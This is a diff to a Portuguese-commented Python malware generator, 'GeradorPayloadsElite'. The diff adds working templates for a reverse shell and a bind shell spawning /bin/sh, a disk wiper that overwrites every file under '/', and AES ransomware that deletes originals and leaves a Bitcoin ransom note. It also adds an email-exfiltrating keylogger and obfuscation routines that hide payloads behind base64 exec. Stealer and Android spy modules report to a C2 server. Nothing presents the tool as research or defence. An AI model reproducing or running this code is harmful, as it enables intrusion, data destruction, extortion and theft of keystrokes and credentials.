@@ -11,35 +11,45 @@ import platform
 import hashlib
 import json
 from typing import Dict, List, Optional
-from cryptography.fernet import Fernet
+
+# Criptografia com pycryptodome (instalado como pycryptodomex)
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+
+# Criptografia simples com chave simétrica (Fernet)
+from cryptography.fernet import Fernet
+
+# Interface colorida no terminal
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
 from rich.prompt import Prompt, Confirm, IntPrompt
 from rich.progress import Progress
 from rich.text import Text
+from rich.syntax import Syntax
+
+# Realce de código no terminal
 import pygments
-from pygments.lexers import PythonLexer, CppLexer
+from pygments.lexers import PythonLexer, BashLexer
 from pygments.formatters import TerminalFormatter
+
 
 console = Console()
 
 class GeradorPayloadsElite:
     def __init__(self):
         self.payloads = {
-            'reverse_tcp_ssl': {
-                'function': self.gerar_reverse_tcp_ssl,
+            'reverse_tcp': {
+                'function': self.gerar_reverse_tcp,
                 'category': 'Shells',
                 'danger_level': 'medium',
-                'description': 'Reverse Shell com criptografia SSL'
+                'description': 'Reverse Shell TCP básico'
             },
-            'bind_tcp_stealth': {
-                'function': self.gerar_bind_tcp_stealth,
+            'bind_tcp': {
+                'function': self.gerar_bind_tcp,
                 'category': 'Shells',
                 'danger_level': 'medium',
-                'description': 'Bind Shell com técnicas de ocultação'
+                'description': 'Bind Shell TCP básico'
             },
             'limpar_disco': {
                 'function': self.gerar_limpador_disco,
@@ -47,11 +57,11 @@ class GeradorPayloadsElite:
                 'danger_level': 'high',
                 'description': 'Sobrescreve o disco com dados aleatórios'
             },
-            'ransomware_avancado': {
-                'function': self.gerar_ransomware_avancado,
+            'ransomware_basico': {
+                'function': self.gerar_ransomware_basico,
                 'category': 'Destrutivos',
                 'danger_level': 'critical',
-                'description': 'Criptografa arquivos com algoritmo híbrido'
+                'description': 'Criptografa arquivos com AES'
             },
             'termux_espiao': {
                 'function': self.gerar_termux_espiao,
@@ -59,17 +69,11 @@ class GeradorPayloadsElite:
                 'danger_level': 'high',
                 'description': 'Módulo de espionagem para Android'
             },
-            'cpp_keylogger': {
-                'function': self.gerar_cpp_keylogger,
-                'category': 'C++',
+            'keylogger': {
+                'function': self.gerar_keylogger,
+                'category': 'Keyloggers',
                 'danger_level': 'high',
-                'description': 'Keylogger em C++ com anti-debug'
-            },
-            'injetor_processo': {
-                'function': self.gerar_injetor_processo,
-                'category': 'Avançados',
-                'danger_level': 'high',
-                'description': 'Injeção de código em processos'
+                'description': 'Keylogger simples em Python'
             },
             'windows_stealer': {
                 'function': self.gerar_windows_stealer,
@@ -238,13 +242,12 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
                 'Shells': "Shells Avançados",
                 'Destrutivos': "Payloads Destrutivos",
                 'Termux': "Módulos Termux",
-                'C++': "Payloads C++",
-                'Avançados': "Técnicas Avançadas",
+                'Keyloggers': "Keyloggers",
                 'Stealers': "Stealers de Dados"
             }
             
             for i, (cod, nome) in enumerate(categorias.items(), 1):
-                perigo = "☠️ CRÍTICO" if cod == 'Destrutivos' else "⚠️ ALTO" if cod in ['Termux', 'Avançados', 'Stealers'] else "◎ MÉDIO"
+                perigo = "☠️ CRÍTICO" if cod == 'Destrutivos' else "⚠️ ALTO" if cod in ['Termux', 'Keyloggers', 'Stealers'] else "◎ MÉDIO"
                 tabela.add_row(str(i), nome, perigo)
             
             tabela.add_row("0", "Configurações", "⚙️")
@@ -265,10 +268,8 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
             elif escolha == "3":
                 self._mostrar_submenu('Termux')
             elif escolha == "4":
-                self._mostrar_submenu('C++')
+                self._mostrar_submenu('Keyloggers')
             elif escolha == "5":
-                self._mostrar_submenu('Avançados')
-            elif escolha == "6":
                 self._mostrar_submenu('Stealers')
             elif escolha == "0":
                 self._mostrar_menu_configuracao()
@@ -359,13 +360,13 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
             
             progress.update(task, completed=100)
         
-        self._preview_payload(payload, 'python' if nome_payload not in ['cpp_keylogger'] else 'cpp')
+        self._preview_payload(payload, 'python')
         self._salvar_payload(nome_payload, payload)
     
     def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
         config = {}
         
-        if nome_payload in ['reverse_tcp_ssl', 'bind_tcp_stealth']:
+        if nome_payload in ['reverse_tcp', 'bind_tcp']:
             console.print(Panel.fit(
                 "[bold]Configuração[/bold]",
                 border_style="blue"
@@ -373,7 +374,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
             config['ip'] = Prompt.ask("[yellow]?[/yellow] IP", default="192.168.1.100")
             config['porta'] = IntPrompt.ask("[yellow]?[/yellow] Porta", default=4444)
         
-        elif nome_payload == 'ransomware_avancado':
+        elif nome_payload == 'ransomware_basico':
             console.print(Panel.fit(
                 "[bold red]Configuração[/bold red]",
                 border_style="red"
@@ -386,7 +387,6 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
                 "[yellow]?[/yellow] Mensagem de resgate",
                 default="Seus arquivos foram criptografados!"
             )
-            config['destruir_backups'] = Confirm.ask("Destruir backups?")
         
         elif nome_payload in ['termux_espiao', 'windows_stealer', 'browser_stealer']:
             config['c2_server'] = Prompt.ask(
@@ -431,7 +431,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
             border_style="yellow"
         ))
         
-        lexer = PythonLexer() if language == 'python' else CppLexer()
+        lexer = PythonLexer() if language == 'python' else BashLexer()
         formatter = TerminalFormatter()
         
         lines = payload.split('\n')[:50]
@@ -444,10 +444,9 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
             console.print("[yellow]... (truncado)[/yellow]")
     
     def _salvar_payload(self, nome_payload: str, payload: str):
-        default_ext = '.py' if nome_payload not in ['cpp_keylogger'] else '.cpp'
         nome_arquivo = Prompt.ask(
             "[yellow]?[/yellow] Nome do arquivo",
-            default=f"payload_{nome_payload}{default_ext}"
+            default=f"payload_{nome_payload}.py"
         )
         
         try:
@@ -567,6 +566,21 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
 {vars_random[4]} = {b64_encoded}
 exec(zlib.decompress(base64.b64decode({vars_random[4]})))"""
     
+    def _ofuscar_metamorfico(self, payload: str) -> str:
+        # Substitui nomes de variáveis e funções
+        replacements = {}
+        lines = payload.split('\n')
+        
+        for i, line in enumerate(lines):
+            if 'def ' in line:
+                func_name = line.split('def ')[1].split('(')[0].strip()
+                new_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+                replacements[func_name] = new_name
+                lines[i] = line.replace(func_name, new_name)
+        
+        # Reconstroi o código
+        return '\n'.join(lines)
+    
     def _ofuscar_com_criptografia(self, payload: str) -> str:
         key = Fernet.generate_key()
         cipher = Fernet(key)
@@ -576,6 +590,22 @@ exec(zlib.decompress(base64.b64decode({vars_random[4]})))"""
 key = {key}
 cipher = Fernet(key)
 exec(cipher.decrypt({encrypted}).decode())"""
+    
+    def _ofuscar_fragmentado(self, payload: str) -> str:
+        parts = []
+        chunk_size = len(payload) // 5
+        for i in range(0, len(payload), chunk_size):
+            part = payload[i:i+chunk_size]
+            parts.append(base64.b64encode(part.encode()).decode())
+        
+        var_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+        code = f"{var_name} = ["
+        for part in parts:
+            code += f'"{part}", '
+        code = code.rstrip(', ') + ']\n'
+        code += f'exec("".join([base64.b64decode(p).decode() for p in {var_name}]))'
+        
+        return f"import base64\n{code}"
     
     def _adicionar_anti_analise(self, payload: str) -> str:
         anti_code = """
@@ -605,7 +635,92 @@ _check_vm()
 """
         return anti_code + payload
 
-    def gerar_termux_espiao(self, c2_server, intervalo=15, **kwargs):
+    # Implementações dos payloads
+    def gerar_reverse_tcp(self, ip: str, porta: int, **kwargs) -> str:
+        return f"""import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("{ip}", {porta}))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])"""
+
+    def gerar_bind_tcp(self, ip: str, porta: int, **kwargs) -> str:
+        return f"""import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(("{ip}", {porta}))
+s.listen(1)
+conn, addr = s.accept()
+os.dup2(conn.fileno(), 0)
+os.dup2(conn.fileno(), 1)
+os.dup2(conn.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])"""
+
+    def gerar_limpador_disco(self, **kwargs) -> str:
+        return """import os
+import random
+
+def limpar_disco():
+    try:
+        for root, dirs, files in os.walk('/'):
+            for file in files:
+                try:
+                    path = os.path.join(root, file)
+                    with open(path, 'wb') as f:
+                        f.write(os.urandom(1024))
+                except:
+                    pass
+    except:
+        pass
+
+limpar_disco()"""
+
+    def gerar_ransomware_basico(self, extensoes: List[str], resgate: str, **kwargs) -> str:
+        ext_str = ', '.join(f'"{ext}"' for ext in extensoes)
+        return f"""import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import base64
+
+KEY = os.urandom(32)
+IV = os.urandom(16)
+
+def encrypt_file(filename):
+    try:
+        with open(filename, 'rb') as f:
+            data = f.read()
+        
+        cipher = AES.new(KEY, AES.MODE_CBC, IV)
+        encrypted = cipher.encrypt(pad(data, AES.block_size))
+        
+        with open(filename + '.encrypted', 'wb') as f:
+            f.write(encrypted)
+        
+        os.remove(filename)
+    except:
+        pass
+
+def gerar_resgate():
+    with open('LEIA-ME.txt', 'w') as f:
+        f.write('''{resgate}
+        
+Para recuperar seus arquivos, envie 0.5 BTC para...
+        ''')
+
+for root, dirs, files in os.walk('/'):
+    for file in files:
+        if any(file.endswith(ext) for ext in [{ext_str}]):
+            encrypt_file(os.path.join(root, file))
+
+gerar_resgate()"""
+
+    def gerar_termux_espiao(self, c2_server: str, intervalo: int, **kwargs) -> str:
         return f"""import os
 import requests
 from threading import Thread
@@ -639,7 +754,60 @@ if __name__ == "__main__":
     spy = TermuxEspiao()
     spy.run()"""
 
-    def gerar_windows_stealer(self, c2_server, intervalo=15, **kwargs):
+    def gerar_keylogger(self, **kwargs) -> str:
+        return """import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+
+class Keylogger:
+    def __init__(self, interval=60, email="", password=""):
+        self.interval = interval
+        self.log = ""
+        self.email = email
+        self.password = password
+    
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        
+        self.log += name
+    
+    def send_email(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+    
+    def report(self):
+        if self.log:
+            if self.email and self.password:
+                self.send_email(self.email, self.password, self.log)
+            
+            self.log = ""
+        
+        Timer(interval=self.interval, function=self.report).start()
+    
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
+
+if __name__ == "__main__":
+    keylogger = Keylogger()
+    keylogger.start()"""
+
+    def gerar_windows_stealer(self, c2_server: str, intervalo: int, **kwargs) -> str:
         return f"""import os
 import requests
 import platform
@@ -673,7 +841,7 @@ if __name__ == "__main__":
     stealer = WindowsStealer()
     stealer.run()"""
 
-    def gerar_browser_stealer(self, c2_server, intervalo=15, **kwargs):
+    def gerar_browser_stealer(self, c2_server: str, intervalo: int, **kwargs) -> str:
         return f"""import os
 import sqlite3
 import requests
